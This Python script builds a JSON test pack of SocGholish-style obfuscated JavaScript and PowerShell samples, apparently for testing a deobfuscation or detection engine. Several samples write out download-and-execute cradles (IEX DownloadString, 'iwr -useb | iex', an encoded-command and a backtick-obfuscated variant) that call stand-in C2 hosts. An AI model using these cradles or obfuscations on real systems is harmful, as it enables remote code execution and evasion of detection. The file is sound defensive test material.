"""
Phase R1 \u00b7 SocGholish (aka FakeUpdates / TA569) family builder.

SocGholish is a JavaScript-heavy fake-browser-update loader tracked by
Mandiant/GTIC, Red Canary, Proofpoint, and Trend Micro. It is
delivered via SEO-poisoned compromised WordPress sites, drives users
to a fake "browser update" download page, and delivers .js payloads
that reconstruct a PowerShell staging cradle at runtime.

This pack amortizes the JavaScript decoder pass across a second
JS-heavy family. Every sample uses one or more of the JS
transformations already covered by GootLoader:
* unicode-escape strings
* atob() chains (including nested)
* .split().reverse().join() shuffles
* .split().join() replace-all
"""
from __future__ import annotations

import base64
import json
from pathlib import Path

FAMILIES_DIR = Path(__file__).resolve().parent / "families"
TARGET = FAMILIES_DIR / "socgholish.json"


def _b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


def _b64_utf16le(s: str) -> str:
    return base64.b64encode(s.encode("utf-16le")).decode("ascii")


def _unicode_escape(s: str) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in s).replace("'", "\\u0027")


def _sample(sid, variant, input_str, interpreter, final_interpreter,
            decoder_chain, final_output_contains, iocs_contains,
            mitre_attack, behaviors):
    return {
        "id": sid,
        "variant": variant,
        "input": input_str,
        "expected": {
            "interpreter": interpreter,
            "final_interpreter": final_interpreter,
            "decoder_chain": decoder_chain,
            "final_output_contains": final_output_contains,
            "iocs_contains": iocs_contains,
            "mitre_attack": mitre_attack,
            "behaviors": behaviors,
        },
    }


_STAGER_URL_1 = "http://socgh-cdn.example.com/update.js"
_STAGER_URL_2 = "https://socgh-cdn2.example.net/browser_upd.js"
_STAGER_URL_3 = "http://socgh-fake.example.org/chrome_update.js"

_PS_CRADLE = 'IEX ((New-Object Net.WebClient).DownloadString("http://socgh-c2.example.com/stage2.ps1"))'


TECHNIQUES: list[dict] = [
    # ---- Technique 1: JS unicode-escape stager ----------------------
    {
        "id": "javascript_unicode_escape_stager",
        "display_name": "JavaScript Unicode-Escape Stager",
        "description": (
            "SocGholish signature: fake browser-update .js delivers a "
            "next-stage command as a `'\\u00XX...' ` string. Observed "
            "in every public SocGholish sample since 2021."
        ),
        "mitre_attack": ["T1027", "T1140", "T1059.007", "T1189"],
        "samples": [
            _sample(
                "SG001", "unicode_escape_url_reveal",
                f"var u = '{_unicode_escape(_STAGER_URL_1)}';",
                "javascript", "javascript",
                ["js-unicode-escape"],
                ["http://socgh-cdn.example.com/update.js"],
                [_STAGER_URL_1],
                ["T1027", "T1140", "T1059.007"],
                ["fake_browser_update_delivery", "javascript_to_powershell_handoff"],
            ),
            _sample(
                "SG002", "unicode_escape_ps_cradle_reveal",
                f"var cmd = '{_unicode_escape(_PS_CRADLE)}';",
                "javascript", "javascript",
                ["js-unicode-escape"],
                ["IEX", "DownloadString", "socgh-c2.example.com/stage2.ps1"],
                ["http://socgh-c2.example.com/stage2.ps1"],
                ["T1027", "T1140", "T1059.007", "T1059.001", "T1105"],
                ["javascript_to_powershell_handoff", "download_and_execute"],
            ),
        ],
    },
    # ---- Technique 2: JS atob() chain ------------------------------
    {
        "id": "javascript_atob_next_stage",
        "display_name": "JavaScript atob() Next-Stage Reveal",
        "description": (
            "atob() and nested atob(atob(...)) reveal the next-stage "
            "URL or PowerShell command. Observed in Mandiant "
            "SocGholish reports."
        ),
        "mitre_attack": ["T1027", "T1140", "T1059.007"],
        "samples": [
            _sample(
                "SG003", "single_atob_url_reveal",
                f"var u = atob('{_b64(_STAGER_URL_2)}');",
                "javascript", "javascript",
                ["js-atob"],
                ["https://socgh-cdn2.example.net/browser_upd.js"],
                [_STAGER_URL_2],
                ["T1027", "T1140", "T1059.007"],
                ["fake_browser_update_delivery", "javascript_to_powershell_handoff"],
            ),
            _sample(
                "SG004", "nested_atob_ps_cradle_reveal",
                f"var c = atob(atob('{_b64(_b64(_PS_CRADLE))}'));",
                "javascript", "javascript",
                ["js-atob"],
                ["IEX", "DownloadString", "socgh-c2.example.com/stage2.ps1"],
                ["http://socgh-c2.example.com/stage2.ps1"],
                ["T1027", "T1140", "T1059.007", "T1059.001", "T1105"],
                ["javascript_to_powershell_handoff", "download_and_execute"],
            ),
        ],
    },
    # ---- Technique 3: split-reverse-join shuffle -------------------
    {
        "id": "javascript_split_shuffle_url_reveal",
        "display_name": "JavaScript .split().reverse().join() Shuffle",
        "description": (
            "The stager URL is stored reversed and reassembled at "
            "runtime with `.split('').reverse().join('')`."
        ),
        "mitre_attack": ["T1027", "T1140", "T1059.007"],
        "samples": [
            _sample(
                "SG005", "split_reverse_join_url_reveal",
                f"var u = '{_STAGER_URL_3[::-1]}'.split('').reverse().join('');",
                "javascript", "javascript",
                ["js-split-reverse-join"],
                [_STAGER_URL_3],
                [_STAGER_URL_3],
                ["T1027", "T1140", "T1059.007"],
                ["fake_browser_update_delivery", "javascript_to_powershell_handoff"],
            ),
        ],
    },
    # ---- Technique 4: split-join replace-all -----------------------
    {
        "id": "javascript_split_join_delimiter_replace",
        "display_name": "JavaScript .split().join() Delimiter Replace",
        "description": (
            "URL slashes replaced with a sentinel character; the .js "
            "reassembles them at runtime with `.split('X').join('/')`."
        ),
        "mitre_attack": ["T1027", "T1140", "T1059.007"],
        "samples": [
            _sample(
                "SG006", "split_join_url_delimiter_reveal",
                "var u = 'http:QQsocgh-sj.example.com/updateQQscript.js'.split('QQ').join('//');",
                "javascript", "javascript",
                ["js-split-join"],
                ["http://socgh-sj.example.com/update//script.js"],
                ["http://socgh-sj.example.com/update//script.js"],
                ["T1027", "T1140", "T1059.007"],
                ["fake_browser_update_delivery"],
            ),
        ],
    },
    # ---- Technique 5: JS \u2192 PowerShell handoff via -EncodedCommand
    {
        "id": "powershell_encodedcommand_from_js",
        "display_name": "PowerShell -EncodedCommand Handoff from JS Stage",
        "description": (
            "After the .js decodes, it invokes powershell.exe with a "
            "-EncodedCommand blob containing the actual stealer/beacon."
        ),
        "mitre_attack": ["T1059.001", "T1027", "T1140", "T1105"],
        "samples": [
            _sample(
                "SG007", "encodedcommand_iex_cradle_from_js",
                "powershell -EncodedCommand " + _b64_utf16le(_PS_CRADLE),
                "powershell", "powershell",
                ["powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
                ["Invoke-Expression", "http://socgh-c2.example.com/stage2.ps1"],
                ["http://socgh-c2.example.com/stage2.ps1"],
                ["T1059.001", "T1027", "T1140", "T1105"],
                ["download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
    # ---- Technique 6: PowerShell string concat URL obfuscation ----
    {
        "id": "powershell_string_concat_url",
        "display_name": "PowerShell URL String-Concat (SocGholish stage-2)",
        "description": (
            "Stage-2 PowerShell reassembles the C2 URL from SQ concat "
            "fragments to evade static URL extraction."
        ),
        "mitre_attack": ["T1059.001", "T1105", "T1027.010"],
        "samples": [
            _sample(
                "SG008", "three_var_url_c2",
                "$a='ht'; $b='tp://socgh-c2-split.example.com'; $c='/beacon'; iex ((new-object net.webclient).downloadstring($a+$b+$c))",
                "powershell", "powershell",
                ["variable-propagate", "string-concat-fold", "alias-expand"],
                ["Invoke-Expression", "http://socgh-c2-split.example.com/beacon"],
                ["http://socgh-c2-split.example.com/beacon"],
                ["T1059.001", "T1105", "T1027.010"],
                ["download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
    # ---- Technique 7: Classic IEX + DownloadString beacon ---------
    {
        "id": "powershell_iex_download_cradle",
        "display_name": "PowerShell IEX DownloadString Beacon",
        "description": (
            "Downstream C2 check-in beacon delivered by SocGholish "
            "PowerShell stage."
        ),
        "mitre_attack": ["T1059.001", "T1105"],
        "samples": [
            _sample(
                "SG009", "iex_downloadstring_beacon",
                "IEX ((New-Object Net.WebClient).DownloadString('http://socgh-beacon.example.com/task'))",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-Expression", "http://socgh-beacon.example.com/task"],
                ["http://socgh-beacon.example.com/task"],
                ["T1059.001", "T1105"],
                ["download_and_execute", "c2_beacon"],
            ),
            _sample(
                "SG010", "iwr_useb_iex_beacon",
                "iwr https://socgh-beacon2.example.net/task -useb | iex",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-WebRequest", "https://socgh-beacon2.example.net/task", "Invoke-Expression"],
                ["https://socgh-beacon2.example.net/task"],
                ["T1059.001", "T1105"],
                ["download_and_execute", "c2_beacon"],
            ),
        ],
    },
    # ---- Technique 8: Backtick alias obfuscation -------------------
    {
        "id": "powershell_backtick_alias_obf",
        "display_name": "PowerShell Backtick Alias Obfuscation",
        "description": (
            "Backticks injected mid-identifier for signature evasion."
        ),
        "mitre_attack": ["T1059.001", "T1027.010"],
        "samples": [
            _sample(
                "SG011", "backtick_iwr_useb_iex",
                "i`wr 'http://socgh-bt.example.com/backtick_stager.ps1' -useb | i`ex",
                "powershell", "powershell",
                ["backtick-strip", "alias-expand"],
                ["Invoke-WebRequest", "http://socgh-bt.example.com/backtick_stager.ps1", "Invoke-Expression"],
                ["http://socgh-bt.example.com/backtick_stager.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["backtick_obfuscation", "download_and_execute"],
            ),
        ],
    },
]

COVERAGE_GAP_TECHNIQUES: list[str] = [
    "wscript_shell_exec",     # .js invokes new ActiveXObject('WScript.Shell')
    "javascript_eval_chain",  # eval(atob(...)) — eval() not modeled yet
]


def build() -> dict:
    known_universe = sorted({t["id"] for t in TECHNIQUES} | set(COVERAGE_GAP_TECHNIQUES))
    return {
        "family_id": "socgholish",
        "family_display_name": "SocGholish",
        "family_version": "r1-2.0.0",
        "schema_version": "technique-first-1.0.0",
        "description": (
            "SocGholish (FakeUpdates / TA569) JavaScript-heavy fake-"
            "browser-update loader. This pack amortizes the JS "
            "decoder pass across a second JS family and covers the "
            "PowerShell handoff stage."
        ),
        "primary_mitre_attack": [
            "T1059.001", "T1059.007", "T1027", "T1027.010",
            "T1140", "T1105", "T1189",
        ],
        "primary_behaviors": [
            "fake_browser_update_delivery",
            "javascript_to_powershell_handoff",
            "download_and_execute",
            "obfuscated_command_line",
            "c2_beacon",
        ],
        "known_technique_universe": known_universe,
        "coverage_gap_techniques": sorted(COVERAGE_GAP_TECHNIQUES),
        "techniques": TECHNIQUES,
    }


def main() -> int:
    FAMILIES_DIR.mkdir(parents=True, exist_ok=True)
    payload = build()
    TARGET.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    sample_count = sum(len(t["samples"]) for t in payload["techniques"])
    print(
        f"Wrote {sample_count} SocGholish samples across "
        f"{len(payload['techniques'])} techniques "
        f"({len(payload['coverage_gap_techniques'])} declared coverage gaps) "
        f"to {TARGET}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
